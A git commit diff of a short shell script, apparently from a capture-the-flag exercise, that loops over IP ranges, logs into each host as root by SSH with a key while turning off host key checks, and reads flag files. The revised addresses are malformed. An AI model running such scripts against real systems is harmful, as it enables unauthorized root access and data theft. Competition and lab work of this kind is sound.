44acbee3ac6e0d4d1e5501a7aedfded85bb6deb9
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2022-12-21 09:01:37 -0500

    Update sshflags.sh

--- sshflags.sh
+++ sshflags.sh
@@ -1,5 +1,5 @@
-for i in $(seq 128 129); 
+for i in $(seq 101 122); 
 do
-  echo "192.168.231.$i"
-  ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" root@192.168.231.$i -i /home/kali/Desktop/apache/key "cat /home/kali/Desktop/apache/flag.txt; echo; /var/flag; echo" 2>/dev/null
+  echo "172.16.10.102.$i"
+  ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" root@172.16.10.102.$i -i /home/kali/Desktop/apache/key "cat /home/kali/Desktop/apache/flag.txt; echo; /var/flag; echo" 2>/dev/null
 done
